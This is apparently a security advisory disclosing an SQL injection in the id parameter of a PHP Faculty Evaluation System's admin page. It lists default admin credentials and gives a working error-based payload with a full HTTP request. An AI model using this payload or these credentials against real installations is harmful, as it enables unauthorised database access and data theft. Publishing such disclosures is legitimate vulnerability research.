# Faculty Evaluation System v1.0 by oretnom23 has SQL injection

Admin account password： admin@admin.com/admin123
 
BUG_Author: WuQi Qi and Zhihong Tian, Guangzhou University

vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /eval/admin/manage_task.php?id=

Vulnerability location: /eval/admin/manage_task.php?id=, id

dbname =evaluation_db

[+] Payload: /eval/admin/manage_task.php?id=1%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id

```sql
GET /eval/admin/manage_task.php?id=1%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lrrse02i69soj9l3lnarhnd9ck
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/233832362-0d030e91-ce80-4c07-8594-ef055a10f67d.png)
